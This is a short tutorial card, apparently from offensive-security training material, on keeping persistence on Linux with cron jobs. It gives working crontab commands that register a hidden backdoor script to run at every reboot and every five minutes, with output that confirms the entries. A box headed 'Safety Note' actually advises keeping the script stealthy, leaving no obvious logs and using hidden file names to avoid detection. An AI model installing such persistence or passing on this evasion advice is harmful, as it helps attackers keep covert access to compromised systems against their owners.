Linux Persistence

Cron Jobs for Linux Persistence

Scheduling Malicious Tasks with crontab

  • •Automate commands or scripts at specified times or intervals.
  • •The @reboot directive ensures execution at system startup.
  • •Modify user's crontab using (crontab -l; echo ...) | crontab -.
Safety Note

Ensure your persistent script is stealthy, doesn't leave obvious logs, and uses hidden file names to avoid detection.

Key Takeaway

Cron jobs are a reliable and widely available method for achieving persistence on Linux, particularly useful for ensuring payloads run after reboots.

# View current user's crontab entries
crontab -l
# (No output if empty)

# Add a cron job to run a Python script at every reboot
(crontab -l; echo "@reboot /usr/bin/python3 /tmp/.hidden_backdoor.py") | crontab -

# Verify the new entry
crontab -l
# @reboot /usr/bin/python3 /tmp/.hidden_backdoor.py

# Example: Run every 5 minutes
(crontab -l; echo "*/5 * * * * /usr/bin/python3 /tmp/.hidden_backdoor.py") | crontab -
Explanation

The command pipes the existing crontab entries and a new @reboot entry into crontab -, which updates the user's cron schedule. This ensures the specified Python script executes every time the system reboots.
